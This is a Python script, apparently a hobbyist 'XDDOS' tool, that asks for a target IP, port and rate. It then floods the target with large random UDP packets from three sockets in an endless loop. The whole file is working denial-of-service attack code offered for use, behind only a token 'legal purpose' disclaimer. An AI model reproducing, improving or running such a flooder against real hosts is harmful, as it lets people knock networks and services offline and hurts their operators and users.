import sys
import os
import time
import socket
import random

red = '\033[1;91m'
green = '\033[1;32m'
blue = '\033[1;34m'
yellow = '\033[1;33m'
white = '\033[37m'

if os.name == "posix":
    os.system('clear')
if os.name == "nt":
    os.system('cls')    
print('\n')    
print("""

 __  __     _____     _____     ______     ______    
/\_\_\_\   /\  __-.  /\  __-.  /\  __ \   /\  ___\   
\/_/\_\/_  \ \ \/\ \ \ \ \/\ \ \ \ \/\ \  \ \___  \  
  /\_\/\_\  \ \____-  \ \____-  \ \_____\  \/\_____\ 
  \/_/\/_/   \/____/   \/____/   \/_____/   \/_____/ 
                                                     
""")    
print("TEAM : BINC")
print("Use this tool for legal purpose!")
print("Made By Mr.X")
ip = raw_input("IP : ")
port = input("Port : ")
size = input("Sent PerSec : ")
try:
    fakeip = '192.165.4.4'
    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65000)
    soc2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes2 = random._urandom(65000)
    soc3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 5000
    if os.name == "posix":
        os.system('clear')
    if os.name == "nt":
        os.system('cls')
    print("\033[1;3mWait Bro.. The Satellite Cannon Is RECHARGE..")
    time.sleep(5)
    while True:
        soc.sendto(bytes, (ip,port))
        soc2.sendto(bytes2, (ip,port))
        soc3.sendto(bytes, (ip,port))
        sent = sent + size
        print "\033[1;34mSending \033[1;33m%s \033[1;34mBotnet To \033[1;33m%s \033[1;34mPort \033[1;33m%s"%(sent,ip,port)
except KeyboardInterrupt:
    print("Keyboard Interrupt")
    exit()
